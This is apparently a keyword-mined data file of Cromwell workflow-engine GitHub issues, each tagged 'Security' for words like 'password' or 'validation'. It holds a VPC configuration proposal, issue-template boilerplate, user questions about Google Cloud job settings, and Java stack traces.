Security,"#### Background. For background information see [this design doc](https://docs.google.com/document/d/1QqXuURg1HlwAymaQkwCL6v9HA5NWsp1pbribvGafNt0/edit?ts=5c6c875c#heading=h.56f418pyjwq8). #### Concept. * Allow Cromwell to spin up PAPIv2 jobs on high security networks ; * At project-creation time, scripts may create a high-security network for that project and record the network name in the project metadata.; * If these fields exist, Cromwell should honor them. #### Proposal. * Use a key in Cromwell's configuration to locate the appropriate project metadata; * For example, perhaps: ; ```; backend {; providers {; PAPIv2 {; config {; backend.providers.PAPIv2.config.vpc {; name: ""terra-network""; subnetwork: ""terra-subnetwork""; }; }; }; }; }; ```; * When about to submit a job to PAPI, see whether the `name` field exists in the configuration.; * If so, check whether the specified label exists in the Google project, eg:; ```; $ gcloud projects describe my-fc-project. createTime: '2017-07-07T17:07:10.345Z'; labels:; terra-network: firecloud; terra-subnetwork: firecloud; lifecycleState: ACTIVE; name: my-fc-project; ```; * If so, deduce a `NETWORK_PATH` by combining the `GOOGLE_PROJECT_ID` (from workflow options) and `NETWORK_NAME` (the label value) as: `projects/GOOGLE_PROJECT_ID/global/networks/NETWORK_NAME`; * Include this in the PAPI request:; ```; pipeline.resources.virtualMachine.network: {; name: NETWORK_PATH; }; ```; * If both the `name` and `subnetwork` fields are defined in configuration, and both exist as project labels:; * The `SUBNETWORK` is the raw value of the `subnetwork` label in the google project; * We additionally provide the subnetwork in the PAPI request:; ```; pipeline.resources.virtualMachine.network: {; name: NETWORK_PATH; subnetwork: SUBNETWORK; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4806:250,secur,security,250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4806,2,['secur'],['security']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. ![Screen Shot 2021-12-01 at 4 39 47 PM](https://user-images.githubusercontent.com/4966343/144191887-75590326-1edb-442d-b2eb-ffb04968a964.png); <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->; Local. <!-- Paste/Attach your workflow if possible: -->; WholeGenomeGermlineSingleSample_develop 3.0.0; https://github.com/broadinstitute/warp/releases/tag/WholeGenomeGermlineSingleSample_develop. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; [cromwell.conf.zip](https://github.com/broadinstitute/cromwell/files/7631795/cromwell.conf.zip). $ java -jar -Dconfig.file=cromwell.conf cromwell-71.jar server; $ curl -X POST --header ""Accept: application/json"" -v ""0.0.0.0:8000/api/workflows/v1"" -F ""workflowSource=@WholeGenomeGermlineSingleSample_develop.wdl"" -F ""workflowInputs=@WholeGenomeGermlineSingleSample_develop.inputs.local.json"" -F ""workflowDependencies=@WholeGenomeGermlineSingleSample_develop.zip""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6582:1398,PASSWORD,PASSWORDS,1398,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6582,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--. Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; We want to submit workflow pipelines on GCP on specified Custom machine type, such as E2, N1, N2, n1-standard-8, etc. can you please support that?; Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6217:1108,PASSWORD,PASSWORDS,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6217,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6459:1108,PASSWORD,PASSWORDS,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6459,5,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Hi, ; Can I ask a question? I think it's related with ; https://github.com/broadinstitute/cromwell/issues/4212. I found the `job_name` is the UUID and it's assigned with subworkflow's UUID if there is a subworflow. What I would like to ask is if there is any other system variables that store the main UUID. As we have our own backend implementation, we need to pass the main UUID to the backend. . Thanks, ; Seung",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6005:1108,PASSWORD,PASSWORDS,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6005,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. hello, ; Support for wdl step-by-step?; After executing a step, wait for the command to execute the next step.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5537:1108,PASSWORD,PASSWORDS,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5537,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; Cromwell version is 55; We had submitted workflow pipelines on GCP PAPIv2 (https://genomics.googleapis.com/), in WDL file, set cpu: ""4"", memory: ""48 GB"", the actual VM created as custom (8 vCPUs, 48 GB memory), for ""memory"": ""64 GB"" ""cpu"": ""8"", the actual VM created as (10 vCPU, 64 GB), Cromwell did not created VM as configured in WDL. Thanks",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6216:1108,PASSWORD,PASSWORDS,1108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6216,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. endpoint-url = ""https://genomics.googleapis.com/""; Cromwell version 55. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; All job submissions stopped working today with errors:; Unable to complete PAPI request due to system or connection error (PipelinesApiRequestHandler actor termination caught by manager)"". Error messages from Cromwell logs:; cromwell.backend.google.pipelines.common.api.PipelinesApiRequestWorker$$anon$1: A batch of PAPI status requests failed. The request manager will retry automatically up to 10 times. The error was: 404 Not Found; POST https://genomics.googleapis.com/batch; <!DOCTYPE html>; <html lang=en>; <meta charset=utf-8>; <meta name=viewport content=""initial-scale=1, minimum-scale=1, width=device-width"">; <title>Error 404 (Not Found)!!1</title>; ...",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6203:1180,PASSWORD,PASSWORDS,1180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6203,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->; The backend the workflow pipelines is https://genomics.googleapis.com/. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; Error message: ; The job was stopped before the command finished. PAPI error code 14. Execution failed: worker was terminated. The job was running on non-preemptible VM, with one instance of nvidia-tesla-t4 attached, nvidiaDriverVersion: 418.40.04. . What does ""PAPI error code 14"" mean? Can you suggest what we should do with it?. Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6306:1180,PASSWORD,PASSWORDS,1180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6306,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. Cromwell lacks support for Shared VPC setup in GCP. Shared VPC model is quite common to large enterprises. Searching for the support I came across the pull request https://github.com/broadinstitute/cromwell/pull/6225 The code changes in this pull request seems to address the shared vpc support. What are the plans to get this on the roadmap for upcoming versions?. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. GCP. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6443:1479,PASSWORD,PASSWORDS,1479,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6443,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###. Hi there,; I'm running Cromwell on a SLURM compute node, so I have enough RAM for the workflow database. Cromwell is used to coordinate this workflow: https://github.com/gatk-workflows/gatk4-somatic-snvs-indels/blob/master/mutect2.wdl on google cloud. When I scancel the SLURM job the google api continues to create VM instances even though the Cromwell job has been killed. How can this be prevented?. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5380:1511,PASSWORD,PASSWORDS,1511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5380,1,['PASSWORD'],['PASSWORDS']
Security,"###; ### IMPORTANT: Please file new issues over in our Jira issue tracker!; ###; ### https://broadworkbench.atlassian.net/projects/BA/issues; ###; ### You may need to create an account before you can view/create issues.; ###; The early release of Cromwell had a script that included some steps of executions and the docker run commands. Currently we are using Cromwell release 52, that script or similar script is not found, for reproducible purpose, our users want to know the actual commands, for example, if three runtime attributes are supplied: gpuType, gpuCount and nvidiaDriverVersion, what is the command line of docker run after NVIDIA driver installed?. Thanks!. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue over in Jira tracker, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're almost in the right place. -->. <!-- You'll want to go to https://broadworkbench.atlassian.net/projects/BA/issues and then tell us: -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5792:1555,PASSWORD,PASSWORDS,1555,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5792,1,['PASSWORD'],['PASSWORDS']
Security,#3984 restored streaming logs. A/C for this ticket would add a regression test for the functionality. One possible centaur implementation for a task:; - Writes to local stdout & stderr; - Calculates the gcloud stdout & stderr path; - Sleep a bit to allow streaming; - Use gsutil to download the stdout & stderr from gcloud; - Validate that the stdout & stderr are as expected,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4187:326,Validat,Validate,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4187,1,['Validat'],['Validate']
Security,$1.apply(MaterializeWorkflowDescriptorActor.scala:87); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:86); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1(MaterializeWorkflowDescriptorActor.scala:86); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:110); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:109); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:109); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:103); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:103); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$receive$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:66); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.aroundReceive(Materia,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1406:4277,Validat,ValidationFlatMap,4277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1406,1,['Validat'],['ValidationFlatMap']
Security,$1.apply(MaterializeWorkflowDescriptorActor.scala:89); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1$1.apply(MaterializeWorkflowDescriptorActor.scala:86); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$1(MaterializeWorkflowDescriptorActor.scala:86); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:110); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2$$anonfun$apply$8.apply(MaterializeWorkflowDescriptorActor.scala:109); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:109); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor$2.apply(MaterializeWorkflowDescriptorActor.scala:103); at scalaz.ValidationFlatMap.flatMap(Validation.scala:433); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:103); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor$$anonfun$receive$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:66); at akka.actor.Actor$class.aroundReceive(Actor.scala:467); at cromwell.engine.workflow.MaterializeWorkflowDescriptorActor.aroundReceive(Materia,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/705:3410,Validat,ValidationFlatMap,3410,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/705,2,['Validat'],['ValidationFlatMap']
Security,$1.apply(WorkflowActor.scala:982) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$fetchLocallyQualifiedInputs$1.apply(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.fetchLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwell.jar:0.19]; at ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5698,Hash,HashMap,5698,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.net.SocketTimeoutException: Read timed out; 	at java.net.SocketInputStream.socketRead0(Native Method); 	at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); 	at java.net.SocketInputStream.read(SocketInputStream.java:171); 	at java.net.SocketInputStream.read(SocketInputStream.java:141); 	at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); 	at sun.security.ssl.InputRecord.read(InputRecord.java:503); 	at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); 	at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); 	at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); 	at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); 	at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); 	at java.io.BufferedInputStream.read(BufferedInputStream.java:345); 	at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); 	at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1569); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1474); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at co,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2229:3736,secur,security,3736,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2229,1,['secur'],['security']
Security,'/mount/point SIZE TYPE' but got: '10 HDD'; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.validatedRuntimeAttributes(PipelinesApiAsyncBackendJobExecutionActor.scala:87); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at 